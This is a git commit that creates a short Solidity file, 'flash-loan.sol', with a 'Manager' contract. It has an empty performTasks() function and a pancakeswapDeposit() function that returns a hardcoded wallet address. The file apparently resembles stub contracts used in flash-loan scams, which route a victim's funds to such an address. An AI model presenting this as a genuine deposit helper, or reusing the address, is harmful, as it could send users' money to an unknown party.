38ca3d3e72fc57c9a1a4003b8bccc9e5ce70f9ec
dorado1 <85234911+dorado1@users.noreply.github.com>
2021-11-01 23:57:33 +0000

    Create flash-loan.sol

---
+++ flash-loan.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure {
+    }
+
+    function pancakeswapDeposit() public pure returns (address) {
+        return 0xb1736230Bf1E10222F98eBCf4039E2c85BB0B378;
+    }
+
+}
